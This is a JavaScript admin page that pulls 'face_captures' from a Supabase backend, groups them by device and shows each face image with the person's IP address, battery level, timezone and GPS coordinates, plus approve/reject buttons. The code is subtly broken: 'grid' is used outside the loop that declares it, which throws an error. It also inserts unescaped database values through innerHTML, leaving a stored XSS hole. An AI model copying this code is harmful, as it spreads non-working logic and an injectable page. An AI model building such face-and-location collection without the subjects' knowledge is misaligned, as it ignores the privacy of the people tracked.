import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';

const SUPABASE_URL = 'https://api.phanhon.xyz';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRtdmltYWNpa3Jucml6eHRjZXNmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgxMDc5NzgsImV4cCI6MjA4MzY4Mzk3OH0.dwh4CWwxE53hbhgjYqOqHZYa1tNyUKNZvdb6Kq5pLC4';

const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

const foldersEl = document.getElementById('folders');
const emptyMsg = document.getElementById('emptyMsg');
const filterBtns = document.querySelectorAll('.filter-btn');
const backBtn = document.getElementById('backBtn');
const folderTitle = document.getElementById('folderTitle');
const folderView = document.getElementById('folderView');
const devicesView = document.getElementById('devicesView');

let currentFilter = 'pending';
let allCaptures = [];

const deviceIcons = {
  'Android': '📱',
  'iOS': '📱',
  'Windows': '💻',
  'Mac': '🖥️',
  'Linux': '🐧',
  'Unknown': '❓'
};

async function loadCaptures(filter) {
  let query = supabase
    .from('face_captures')
    .select('*')
    .order('created_at', { ascending: false });

  const { data: captures, error } = await query;
  if (error) { console.error(error); return; }

  const { data: devices } = await supabase.from('device_details').select('*');

  allCaptures = captures.map(c => {
    const device = devices?.find(d => {
      const timeDiff = Math.abs(new Date(c.created_at) - new Date(d.created_at));
      return timeDiff < 60000;
    });
    return { ...c, device: device || null };
  });

  if (filter !== 'all') {
    allCaptures = allCaptures.filter(c => c.status === filter);
  }

  renderDevices();
}

function renderDevices() {
  foldersEl.innerHTML = '';
  devicesView.classList.remove('hidden');
  folderView.classList.add('hidden');

  const groups = {};
  allCaptures.forEach(c => {
    const key = c.device?.device || 'Unknown';
    if (!groups[key]) groups[key] = { device: key, captures: [], latestDevice: c.device };
    groups[key].captures.push(c);
  });

  if (Object.keys(groups).length === 0) {
    emptyMsg.classList.remove('hidden');
    return;
  }

  emptyMsg.classList.add('hidden');

  Object.values(groups).forEach(group => {
    const card = document.createElement('div');
    card.className = 'device-folder';

    const deviceName = group.device;
    const icon = deviceIcons[deviceName] || '❓';
    const count = group.captures.length;
    const pending = group.captures.filter(c => c.status === 'pending').length;

    let meta = '';
    if (group.latestDevice) {
      const d = group.latestDevice;
      meta = [
        d.language,
        d.screen_width + 'x' + d.screen_height,
        d.network_type,
        d.ip_address
      ].filter(Boolean).join(' · ');
    }

    card.innerHTML =
      '<div class="folder-header">' +
        '<span class="folder-icon">' + icon + '</span>' +
        '<div class="folder-info">' +
          '<div class="folder-name">' + deviceName + '</div>' +
          '<div class="folder-meta">' + meta + '</div>' +
        '</div>' +
        '<div class="folder-counts">' +
          '<span class="folder-count">' + count + ' captures</span>' +
          (pending > 0 ? '<span class="folder-pending">' + pending + ' pending</span>' : '') +
        '</div>' +
      '</div>';

    card.addEventListener('click', () => openFolder(group));
    foldersEl.appendChild(card);
  });
}

function openFolder(group) {
  devicesView.classList.add('hidden');
  folderView.classList.remove('hidden');
  folderTitle.textContent = deviceIcons[group.device] + ' ' + group.device;
  renderCaptures(group.captures);
}

function renderCaptures(captures) {
  folderView.querySelector('.captures-grid').innerHTML = '';

  captures.forEach(c => {
    const grid = folderView.querySelector('.captures-grid');
    const card = document.createElement('div');
    card.className = 'capture-card';

    const time = new Date(c.created_at).toLocaleString();
    const imageUrl = c.image_url.replace('https://tmvimacikrnrizxtcesf.supabase.co', 'https://api.phanhon.xyz');

    let meta = '';
    if (c.device) {
      const d = c.device;
      meta = '<div class="capture-device">' +
        [d.platform, d.timezone, d.ip_address, d.battery_level != null ? Math.round(d.battery_level * 100) + '% battery' : null, d.latitude ? '📍 ' + d.latitude.toFixed(4) + ', ' + d.longitude.toFixed(4) : null]
          .filter(Boolean)
          .join(' · ') +
      '</div>';
    }

    let actionsHTML = '';
    if (c.status === 'pending') {
      actionsHTML =
        '<button class="btn success" data-id="' + c.id + '" data-action="approved">Approve</button>' +
        '<button class="btn danger" data-id="' + c.id + '" data-action="rejected">Reject</button>';
    } else {
      actionsHTML =
        '<button class="btn retake" data-id="' + c.id + '" data-action="pending">Reset</button>';
    }

    card.innerHTML =
      '<img src="' + imageUrl + '" alt="Capture">' +
      '<div class="capture-info">' +
        '<div class="time">' + time + '</div>' +
        meta +
        '<span class="status-badge ' + c.status + '">' + c.status + '</span>' +
        '<div class="capture-actions">' + actionsHTML + '</div>' +
      '</div>';

    grid.appendChild(card);
  });

  grid.querySelectorAll('.btn[data-action]').forEach(btn => {
    btn.addEventListener('click', () => updateStatus(btn.dataset.id, btn.dataset.action));
  });
}

backBtn.addEventListener('click', renderDevices);

async function updateStatus(id, status) {
  const updates = { status: status };
  if (status === 'approved') updates.approved_at = new Date().toISOString();
  if (status === 'rejected') updates.rejected_at = new Date().toISOString();

  await supabase.from('face_captures').update(updates).eq('id', id);
  loadCaptures(currentFilter);
}

filterBtns.forEach(btn => {
  btn.addEventListener('click', () => {
    filterBtns.forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    currentFilter = btn.dataset.filter;
    loadCaptures(currentFilter);
  });
});

loadCaptures('pending');
